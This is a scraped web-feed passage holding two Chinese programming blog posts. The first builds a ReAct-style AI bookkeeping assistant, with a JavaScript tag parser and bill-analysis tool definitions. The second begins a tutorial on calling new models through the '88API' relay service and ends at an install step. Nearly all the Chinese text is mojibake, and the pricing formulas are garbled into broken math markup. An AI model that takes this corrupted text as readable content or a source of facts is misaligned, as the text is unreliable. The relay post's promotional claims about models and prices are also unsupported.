        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;TITLE&gt;[\s\S]*?(?:&lt;/</span><span class="hljs-variable constant_">TITLE</span>&gt;|$)/gi, <span class="hljs-string">""</span>)
        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;Thought&gt;[\s\S]*?(?:&lt;/</span><span class="hljs-title class_">Thought</span>&gt;|$)/gi, <span class="hljs-string">""</span>)
        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;Tool&gt;[\s\S]*?(?:&lt;/</span><span class="hljs-title class_">Tool</span>&gt;|$)/gi, <span class="hljs-string">""</span>)
        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;Answer&gt;[\s\S]*?(?:&lt;/</span><span class="hljs-title class_">Answer</span>&gt;|$)/gi, <span class="hljs-string">""</span>) <span class="hljs-comment">// æ–°å¢ï¼šç§»é™¤ Answer æ ‡è®°åŠå…¶å†…éƒ¨å†…å®¹</span>
        .<span class="hljs-title function_">trim</span>();

    <span class="hljs-comment">// æœ€ç»ˆæ˜¾ç¤ºå†…å®¹çš„ä¼˜å…ˆçº§ï¼š</span>
    <span class="hljs-comment">// 1. å¦‚æœæœ‰ &lt;Answer&gt; æ ‡ç­¾ï¼Œä¼˜å…ˆä½¿ç”¨æ ‡ç­¾å†…çš„å†…å®¹</span>
    <span class="hljs-comment">// 2. å¦‚æœæ²¡æœ‰ &lt;Answer&gt; æ ‡ç­¾ï¼Œåˆ™ä½¿ç”¨ç§»é™¤æ‰€æœ‰æ ‡ç­¾åçš„å‰©ä½™æ–‡æœ¬</span>
    <span class="hljs-keyword">const</span> content = answerTagContent || cleanedRemainder;

    <span class="hljs-keyword">return</span> {
        title,
        thought,
        toolCall,
        content,
        <span class="hljs-attr">raw</span>: response,
    };
}
</code></pre>
<blockquote>
<p>xmlç‰ˆâ€œfunction callâ€è§£æå™¨</p>
</blockquote>
<h2 data-id="heading-3">å‡½æ•°ä¼˜åŒ–</h2>
<p>è§£å†³äº†å¤§æ¨¡å‹å¦‚ä½•è°ƒç”¨å·¥å…·çš„é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®¾è®¡å·¥å…·äº†ï¼Œå¯¹äºè®°è´¦Appæ¥è¯´ï¼Œå³ä½¿è¿‡æ»¤å‡ºäº†ä¸€æ®µæ—¶é—´çš„è´¦å•ï¼Œæ•°é‡ä¹Ÿå¯èƒ½è¿˜æ˜¯å¤ªå¤šäº†ï¼Œç›´æ¥è¿”å›è¿‡æ»¤åçš„ç»“æœè´¦å•ä¹Ÿæ²¡æœ‰æ¯”ä¸€å¼€å§‹çš„å®ç°å¥½ä¸Šå¤šå°‘ã€‚å› æ­¤ï¼Œè®¾è®¡ä¸€ä¸ªå…·æœ‰ç»Ÿè®¡åŠŸèƒ½çš„å·¥å…·æ˜¯å¿…è¦çš„ï¼Œå®ƒåº”è¯¥è¿”å›å…¨å±€æ€§çš„ç»Ÿè®¡æ•°æ®ï¼Œè€Œéå•çº¯çš„è´¦å•è¿‡æ»¤ï¼Œåªæœ‰å½“ç”¨æˆ·æ˜ç¡®éœ€è¦æŸ¥è¯¢å…·ä½“è´¦å•æ—¶ï¼Œæ‰è®©å¤§æ¨¡å‹å»è°ƒç”¨å¯¹åº”çš„æœç´¢å·¥å…·ã€‚ä¸ºæ­¤ï¼Œæˆ‘è®©Geminiè®¾è®¡äº†å¦‚ä¸‹å‡ ä¸ªå‡½æ•°ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># å¯ç”¨å·¥å…·</span>

<span class="hljs-section">## 1. analyze<span class="hljs-emphasis">_bills - è´¦å•ç»Ÿè®¡ä¸åˆ†æ (ä¼˜å…ˆä½¿ç”¨)
<span class="hljs-strong">**å¼ºçƒˆå»ºè®®**</span>ï¼šå½“ç”¨æˆ·è¯¢é—®â€œæ€»é¢â€ã€â€œå æ¯”â€ã€â€œå“ªç±»èŠ±é’±æœ€å¤šâ€ã€â€œè¶‹åŠ¿â€ã€â€œæ¦‚å†µâ€æ—¶ï¼Œå¿…é¡»ä½¿ç”¨æ­¤å·¥å…·ã€‚å®ƒèƒ½è¿”å›é«˜å¯†åº¦çš„ç»Ÿè®¡ç»“æœï¼Œé¿å…æ•°æ®è¿‡è½½ã€‚
- <span class="hljs-strong">**å‚æ•°**</span>:
  - function: "analyze_</span>bills"</span>
<span class="hljs-bullet">  -</span> startTime: YYYY-MM-DD
<span class="hljs-bullet">  -</span> endTime: YYYY-MM-DD
<span class="hljs-bullet">  -</span> categoryNames: åˆ†ç±»åï¼ˆé€—å·åˆ†éš”ï¼Œæ”¯æŒæ¨¡ç³ŠåŒ¹é…ï¼‰
<span class="hljs-bullet">  -</span> tagNames: æ ‡ç­¾åï¼ˆé€—å·åˆ†éš”ï¼‰
<span class="hljs-bullet">  -</span> keyword: å¤‡æ³¨å…³é”®è¯
<span class="hljs-bullet">  -</span> minAmount / maxAmount: é‡‘é¢èŒƒå›´ï¼ˆæ•°å­—ï¼‰
<span class="hljs-bullet">  -</span> billType: "income" æˆ– "expense"
<span class="hljs-bullet">  -</span> groupBy: åˆ†ç»„ç»´åº¦ï¼Œå¯é€‰å€¼ï¼š
<span class="hljs-bullet">    -</span> "category": æŒ‰åˆ†ç±»ç»Ÿè®¡ï¼ˆé»˜è®¤ï¼Œé€‚åˆçœ‹æ¶ˆè´¹æ„æˆï¼‰
<span class="hljs-bullet">    -</span> "tag": æŒ‰æ ‡ç­¾ç»Ÿè®¡ï¼ˆé€‚åˆçœ‹ç‰¹å®šäº‹ä»¶/é¡¹ç›®ï¼‰
<span class="hljs-bullet">    -</span> "day": æŒ‰æ—¥ç»Ÿè®¡ï¼ˆé€‚åˆçœ‹æ¯æ—¥å˜åŒ–ï¼‰
<span class="hljs-bullet">    -</span> "month": æŒ‰æœˆç»Ÿè®¡ï¼ˆé€‚åˆçœ‹æœˆåº¦è¶‹åŠ¿ï¼‰
<span class="hljs-bullet">  -</span> limit: è¿”å›å‰å‡ é¡¹ï¼ˆæ•°å­—ï¼Œé»˜è®¤10ï¼‰
<span class="hljs-bullet">  -</span> includeTrend: "true" æˆ– "false" (æ˜¯å¦åŒ…å«æ—¶é—´è¶‹åŠ¿æ•°æ®ï¼Œç”¨äºåˆ†ææ³¢åŠ¨)

<span class="hljs-section">## 2. query<span class="hljs-emphasis">_bills - æŸ¥è¯¢åŸå§‹è´¦å•æ˜ç»†
<span class="hljs-strong">**ä»…åœ¨ä»¥ä¸‹æƒ…å†µä½¿ç”¨**</span>ï¼šç”¨æˆ·æ˜ç¡®è¯¢é—®â€œå…·ä½“çš„æŸä¸€ç¬”äº¤æ˜“â€ã€â€œæœç´¢ç‰¹å®šå¤‡æ³¨â€æˆ–â€œåˆ—å‡ºæœ€è¿‘å‡ ç¬”è´¦å•â€æ—¶ã€‚ä¸è¦ç”¨äºå®è§‚ç»Ÿè®¡ã€‚
- <span class="hljs-strong">**å‚æ•°**</span>:
  - function: "query_</span>bills"</span>
<span class="hljs-bullet">  -</span> xxx

<span class="hljs-section">## 3. get<span class="hljs-emphasis">_account_</span>meta - è·å–è´¦æœ¬ä¿¡æ¯</span>
ç”¨äºè·å–å½“å‰è´¦æœ¬å®šä¹‰çš„åˆ†ç±»ç»“æ„å’Œæ ‡ç­¾åˆ—è¡¨ã€‚
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å‚æ•°**</span>:
<span class="hljs-bullet">  -</span> function: "get<span class="hljs-emphasis">_account_</span>meta"
</code></pre>
<p>å†é€šè¿‡æç¤ºè¯å¼•å¯¼å¤§æ¨¡å‹åœ¨åˆé€‚çš„åœºæ™¯è°ƒç”¨åˆé€‚çš„å‡½æ•°ï¼Œæœ€ç»ˆä¼ é€’ç»™å¤§æ¨¡å‹çš„tokenæ•°é‡å¾—åˆ°äº†å¤§å¹…ç¼©å‡ï¼Œä¸ä»…å®ˆæŠ¤äº†ç”¨æˆ·çš„é’±åŒ…ï¼Œä¹Ÿè·å¾—äº†æ›´é«˜çš„å›ç­”è´¨é‡ã€‚</p>
<p>è‡³æ­¤ï¼ŒåŸºäºæ™ºè°±GLM-Flashçš„ï¼Œèƒ½å¤ŸåŠ¨æ€è¿›è¡Œè´¦å•åˆ†æçš„ReActæ¨¡å¼ç‰ˆAIåŠ©æ‰‹åŠŸèƒ½æ­£å¼ä¸Šçº¿Centï¼Œæˆ‘å°è¯•äº†é¢„è®¾æç¤ºè¯ï¼Œæ¯ä¸ªæç¤ºè¯éƒ½èƒ½å¾ˆå¥½åœ°å®Œæˆä»å‡½æ•°è°ƒç”¨åˆ°æ•°æ®åˆ†æçš„å®Œæ•´é“¾è·¯ï¼Œå³ä½¿æ˜¯â€œç”Ÿæˆå¹´åº¦æ€»ç»“â€è¿™ç§éœ€è¦å¤šæ­¥æ¨ç†å’Œå‡½æ•°è°ƒç”¨çš„é—®é¢˜ï¼Œæ¨¡å‹ä¹Ÿèƒ½å¾ˆå¥½åœ°ä¸€æ­¥æ­¥è¿›è¡Œæ‰§è¡Œå’Œæ±‡æ€»ï¼Œæ•ˆæœè®©æˆ‘ååˆ†æ»¡æ„ï¼Œåªæ˜¯å—é™äºæ¨¡å‹æœ¬èº«çš„å‚æ•°ï¼Œç”Ÿæˆçš„å›ç­”æ·±åº¦æ¯”èµ·å…¶ä»–é—­æºæ¨¡å‹è¿˜æ˜¯å·®äº†ç‚¹æ„æ€ï¼Œä¸è¿‡æ™ºè°±çš„APIæ˜¯æˆ‘æš‚æ—¶èƒ½æ‰¾åˆ°çš„å”¯ä¸€å…è´¹ï¼Œä¸”æ”¯æŒè·¨åŸŸçš„APIäº†ï¼Œè¿˜è¦å•¥è‡ªè¡Œè½¦å‘¢ã€‚</p>
<p>æŠ›å¼€æœ€ç»ˆæ•ˆæœä¸è°ˆï¼Œæ¢ç´¢Agentæ¨¡å¼æœ¬èº«ä¹Ÿå¾ˆæœ‰æ„ä¹‰ï¼Œé€šè¿‡æç¤ºè¯å·¥ç¨‹ï¼Œè®©å¤§æ¨¡å‹ä¸€æ­¥æ­¥æŒ‰ç…§è‡ªå·±çš„æƒ³æ³•æ‰§è¡Œï¼Œå°±åƒåŸ¹å…»ä¸€ä¸ªå¬è¯ä½†ä¸å¤ªçµå…‰çš„å­©å­ï¼Œæœ‰ç§â€œæ¨¡æ‹Ÿå…»æˆâ€çš„å¿«ä¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»0åˆ°1æ­å»ºAIåº”ç”¨:GPT-5.2æ¥å…¥å®Œæ•´å®æˆ˜(2026æœ€æ–°)]]></title>    <link>https://juejin.cn/post/7594398051722100774</link>    <guid>https://juejin.cn/post/7594398051722100774</guid>    <pubDate>2026-01-13T03:44:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594398051722100774" data-draft-id="7594398051722051622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»0åˆ°1æ­å»ºAIåº”ç”¨:GPT-5.2æ¥å…¥å®Œæ•´å®æˆ˜(2026æœ€æ–°)"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-13T03:44:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ›¦å’Œ"/> <meta itemprop="url" content="https://juejin.cn/user/1116759545101406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»0åˆ°1æ­å»ºAIåº”ç”¨:GPT-5.2æ¥å…¥å®Œæ•´å®æˆ˜(2026æœ€æ–°)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759545101406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ›¦å’Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:44:38.000Z" title="Tue Jan 13 2026 03:44:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ‘˜è¦</strong>ï¼š2026å¹´ï¼ŒAIå¤§æ¨¡å‹é¢†åŸŸè¿æ¥å‰§å˜ã€‚OpenAIå‘å¸ƒçš„ <strong>GPT-5.2</strong> å½»åº•æ”¹å˜äº†äººæœºäº¤äº’æ ‡å‡†ï¼ŒAnthropic çš„ <strong>Claude Opus 4.5</strong> ä»¥ 80.9% çš„ SWE-bench æˆç»©ç»Ÿæ²»äº†ç¼–ç¨‹é¢†åŸŸï¼ŒGoogle çš„ <strong>Gemini 3</strong> åˆ™åœ¨å¤šæ¨¡æ€ä¸Šç‹¬é¢†é£éªšã€‚æœ¬æ–‡å°†æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•é€šè¿‡ <strong>88API</strong> ä¸€ç«™å¼æ¥å…¥è¿™äº›æœ€å¼ºæ¨¡å‹ï¼Œä»ç¯å¢ƒæ­å»ºåˆ°å¼€å‘ä¸€ä¸ªå…·å¤‡"æ€è€ƒ"èƒ½åŠ›çš„AI Agentï¼Œå…¨æµç¨‹å®æˆ˜ã€‚ï¼ˆæœ¬æ–‡æ›´æ–°äº2026å¹´1æœˆï¼‰</p>
</blockquote>
<h3 data-id="heading-0">ä¸€ã€ 2026å¹´AIæ¨¡å‹é€‰å‹æŒ‡å—ï¼šä¸‰è¶³é¼ç«‹çš„æ–°æ ¼å±€</h3>
<p>åœ¨å¼€å§‹å¼€å‘ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£å½“å‰ï¼ˆ2026å¹´1æœˆï¼‰çš„æ¨¡å‹æ ¼å±€ã€‚GPT-4 å·²ç»æˆä¸ºè¿‡å»å¼ï¼Œç°åœ¨çš„é€‰æ‹©æ›´å¤šã€æ›´å¼ºã€ä¹Ÿæ›´ä¾¿å®œã€‚</p>
<h4 data-id="heading-1">1. OpenAI GPT-5.2 ç³»åˆ—ï¼šç»¼åˆèƒ½åŠ›çš„ç‹è€…</h4>
<p>2025å¹´12æœˆï¼ŒOpenAI éœ‡æ’¼å‘å¸ƒäº† GPT-5.2 ç³»åˆ—ï¼ŒåŒ…å«ä¸‰ä¸ªç‰ˆæœ¬ï¼š</p>
<ul>
<li>
<p><strong>GPT-5.2 Instant</strong>ï¼šæé€Ÿç‰ˆï¼Œä¸ä»…å¿«ï¼Œè€Œä¸”æ¯” GPT-4o æ›´èªæ˜ï¼Œé€‚åˆé«˜å¹¶å‘å¯¹è¯ã€‚</p>
</li>
<li>
<p><strong>GPT-5.2 Thinking</strong>ï¼šæ¨ç†ç‰ˆï¼Œå…·å¤‡æ·±åº¦æ€è€ƒèƒ½åŠ›ï¼Œé€‚åˆå¤æ‚é€»è¾‘åˆ†æã€‚</p>
</li>
<li>
<p><strong>GPT-5.2 Pro</strong>ï¼šä¸“å®¶ç‰ˆï¼Œå½“å‰åœ°çƒä¸Šæœ€å¼ºçš„é€šç”¨æ¨¡å‹ã€‚</p>
</li>
<li>
<p><strong>GPT-5.2-Codex</strong>ï¼š2025å¹´12æœˆ19æ—¥å‘å¸ƒçš„ç¼–ç¨‹ä¸“ç”¨æ¨¡å‹ã€‚</p>
</li>
</ul>
<p><strong>æ ¸å¿ƒå‚æ•°ä¸ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>
<p><strong>ä¸Šä¸‹æ–‡çª—å£</strong>ï¼šå…¨ç³»æ ‡é… <strong>400K Tokens</strong>ï¼ˆè¶³ä»¥å¡è¿›æ•´æœ¬æŠ€æœ¯ä¹¦ç±ï¼‰ã€‚</p>
</li>
<li>
<p><strong>è¾“å‡ºé™åˆ¶</strong>ï¼šå¤§å¹…æå‡è‡³ <strong>128K Tokens</strong>ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½é£è·ƒ</strong>ï¼šåœ¨ GDPval åŸºå‡†æµ‹è¯•ä¸­ï¼Œ<strong>70.9%</strong> çš„ä»»åŠ¡è¾¾åˆ°äººç±»ä¸“å®¶æ°´å¹³ï¼ˆç›¸æ¯”ä¹‹ä¸‹ GPT-5.1 ä»…ä¸º 38.8%ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä»·æ ¼</strong>ï¼šè™½ç„¶æ¯” 5.1 ç•¥è´µï¼Œä½†æ€§ä»·æ¯”æé«˜â€”â€”<strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.75</mn><mi mathvariant="normal">/</mi><mn>1</mn><mi>M</mi><mi>I</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>âˆ—</mo><mo>âˆ—</mo><mo separator="true">,</mo><mo>âˆ—</mo><mo>âˆ—</mo></mrow><annotation encoding="application/x-tex">1.75 / 1M Input**, **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1.75/1</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"/><span class="mord">âˆ—</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ—</span><span class="mord">âˆ—</span></span></span></span></span>14 / 1M Output</strong>ã€‚</p>
</li>
</ul>
<h4 data-id="heading-2">2. Anthropic Claude 4.5 ç³»åˆ—ï¼šç¨‹åºå‘˜çš„æ¢¦ä¸­æƒ…æ¨¡</h4>
<p>Anthropic åœ¨ 2025å¹´11æœˆ24æ—¥ å‘å¸ƒçš„ <strong>Claude Opus 4.5</strong> æ˜¯ç›®å‰çš„"ç¼–ç¨‹ä¹‹ç¥"ã€‚</p>
<ul>
<li>
<p><strong>ç¼–ç¨‹èƒ½åŠ›</strong>ï¼šåœ¨ SWE-bench Verified æµ‹è¯•ä¸­è¾¾åˆ°äº†æƒŠäººçš„ <strong>80.9%</strong>ï¼Œè¶…è¶Šäº† GPT-5.1-Codex-Max (77.9%)ã€‚</p>
</li>
<li>
<p><strong>ä»·æ ¼è‰¯å¿ƒ</strong>ï¼š<strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi mathvariant="normal">/</mi><mn>1</mn><mi>M</mi><mi>I</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>âˆ—</mo><mo>âˆ—</mo><mo separator="true">,</mo><mo>âˆ—</mo><mo>âˆ—</mo></mrow><annotation encoding="application/x-tex">5 / 1M Input**, **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">5/1</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"/><span class="mord">âˆ—</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ—</span><span class="mord">âˆ—</span></span></span></span></span>25 / 1M Output</strong>ã€‚ç›¸æ¯”ä¸Šä¸€ä»£ Opus 3ï¼Œä»·æ ¼æš´é™ <strong>67%</strong>ï¼Œæ€§èƒ½å´å¤§å¹…æå‡ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šä»£ç é‡æ„ã€å¤æ‚ç®—æ³•å®ç°ã€é•¿æ–‡æ¡£æ·±åº¦é˜…è¯»ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">3. Google Gemini 3ï¼šå¤šæ¨¡æ€äº¤äº’é¦–é€‰</h4>
<p>2026å¹´1æœˆåˆšåˆšå‘å¸ƒçš„ Gemini 3ï¼Œåœ¨è§†é¢‘ç†è§£å’Œé•¿çª—å£ï¼ˆ10M Tokensï¼‰ä¸Šä¾ç„¶ä¿æŒé¢†å…ˆï¼Œé€‚åˆéœ€è¦å¤„ç†å¤§é‡è§†é¢‘ã€éŸ³é¢‘æ•°æ®çš„åº”ç”¨ã€‚</p>
<h3 data-id="heading-4">äºŒã€ å‡†å¤‡å·¥ä½œï¼šæ¥å…¥ 88API èšåˆå¹³å°</h3>
<p>å¯¹äºå›½å†…å¼€å‘è€…ï¼Œç›´æ¥ç®¡ç† OpenAIã€Anthropicã€Google ä¸‰å®¶çš„è´¦å·å’Œæ”¯ä»˜éå¸¸ç¹çã€‚<strong>88API (api.88api.chat)</strong> æä¾›äº†ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>
<p><strong>å…¨æ¨¡å‹æ”¯æŒ</strong>ï¼šä¸€ä¸ª Key è°ƒç”¨ GPT-5.2ã€Claude Opus 4.5ã€Gemini 3 ç­‰æ‰€æœ‰ä¸»æµæ¨¡å‹ã€‚</p>
</li>
<li>
<p><strong>å›½å†…ç›´è¿</strong>ï¼šé’ˆå¯¹å›½å†…ç½‘ç»œç¯å¢ƒä¼˜åŒ–ï¼Œæ— éœ€ VPNï¼Œä½å»¶è¿Ÿã€‚</p>
</li>
<li>
<p><strong>å…¼å®¹æ€§å¼º</strong>ï¼šå®Œå…¨å…¼å®¹ OpenAI æ¥å£æ ¼å¼ï¼Œæ— éœ€ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œåªéœ€æ”¹ <code>model</code> å‚æ•°ã€‚</p>
</li>
<li>
<p><strong>ä¼ä¸šçº§ç¨³å®š</strong>ï¼šé«˜å¹¶å‘æ”¯æŒï¼Œé€‚åˆç”Ÿäº§ç¯å¢ƒã€‚</p>
</li>
</ol>
<h4 data-id="heading-5">æ³¨å†Œä¸è·å– API Key</h4>
<ol>
<li>
<p>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.88api.chat" target="_blank" title="https://api.88api.chat" ref="nofollow noopener noreferrer">88APIå®˜ç½‘</a>ã€‚</p>
</li>
<li>
<p>æ³¨å†Œè´¦å·å¹¶ç™»å½•æ§åˆ¶å°ã€‚</p>
</li>
<li>
<p>åœ¨â€œä»¤ç‰Œç®¡ç†â€ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ API Keyï¼ˆä»¥ <code>sk-</code> å¼€å¤´ï¼‰ã€‚</p>
</li>
</ol>
<h3 data-id="heading-6">ä¸‰ã€ å®æˆ˜ï¼šHello World (Python)</h3>
<p>æˆ‘ä»¬å°†ä½¿ç”¨æ ‡å‡†çš„ <code>openai</code> Python åº“æ¥è°ƒç”¨ 88APIã€‚</p>
<h4 data-id="heading-7">1. ç¯å¢ƒå®‰è£…</h4>
<p>ç¡®ä¿ä½ çš„ Python ç‰ˆæœ¬åœ¨ 3.10 ä»¥ä¸Šã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pip install openai python-dotenv
</code></pre>
<h4 data-id="heading-8">2. ç¬¬ä¸€ä¸ªè°ƒç”¨ï¼šä½“éªŒ GPT-5.2 Instant</h4>
